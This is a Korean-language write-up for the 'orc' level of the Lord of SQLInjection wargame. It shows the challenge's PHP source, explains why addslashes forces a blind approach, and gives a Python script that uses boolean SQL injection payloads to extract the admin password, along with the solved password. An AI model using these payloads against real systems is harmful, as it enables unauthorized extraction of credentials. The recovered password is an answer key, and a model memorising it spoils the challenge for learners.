# Orc Problem

![Orc image](../image/orc_web_page.png)

### hint

주 언어로 blind sql injection script 짜야된다.

blind sql injection 을 모르면 밑의 링크로 참고하면 좋다.

+ [blind sql injection](https://github.com/kimminwyk/Study-notes/tree/master/MYSQL/MYSQL-SQL-injection/blind-sql-injection)

mysql 사용 함수는 substr , mid , left length 등등 문자열 자르기를 사용하면 된다.

### los rubiya problem Script

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

### 핵심
```php
$_GET[pw] = addslashes($_GET[pw]); 

$query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 

if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
```
첫번째 쿼리를 전송하고 두번째 쿼리를 만들때

addslashes 함수를 사용하여 ' , " 같은 쿼터들로 sql injection이 불가능하기때문에

blind sql injection 으로 결과 참 거짓을 구별하고 문자열을 조합해서 pw=비밀번호 이런식으로
넣으면 된다.

<details>
<summary>Payload</summary>
<div markdown="1">

```py
import requests

Cookies = {
    'PHPSESSID':'PHPSESSID Value'
    #los.rubiya.kr 에서 로그인 인증하기위ㅣ해 추가한다.
}

for length in range(1,10):
    
    url = f'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20id=%27admin%27%20and%20length(pw)={length}%23%27'

    r = requests.get(url = url,cookies = Cookies).text

    if r.find("<br><h2>Hello admin</h2>") > 0:
        print('los.rubiya.kr orc password length :',length)

string = ''
for i in range(1,9):
    for substr in range(48,123):
        url = f'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20id=%27admin%27%20and%20BINARY%20substr(pw,{i},1)=%27{chr(substr)}%27%23%27'

        r = requests.get(url = url,cookies = Cookies).text

        if r.find("<br><h2>Hello admin</h2>") > 0:
            print(chr(substr),end='')
            string += chr(substr)
            break

print('los.rubiay.kr ord Problem password :',string)
```

제일 짜기 쉬운 python 으로 blind sql injection을 구현했다.

Cookies에 있는 PHPSESSID 는 los.rubiya.kr에서 로그인 체크때문에 필수로 넣어야된다.

만약에 안넣으면 

```js
<script>location.href='../'</script>
``` 

이런식으로 응답이나와 문제에 접근이

불가능하기때문에 Cookies 추가한다음에 url 에 blind sqli 를 구현하면 된다.

password : 095a9852

```sql
?pw=095a9852
> select pw from prob_orc where id='admin' and pw='095a9852'
```

</div>
</details>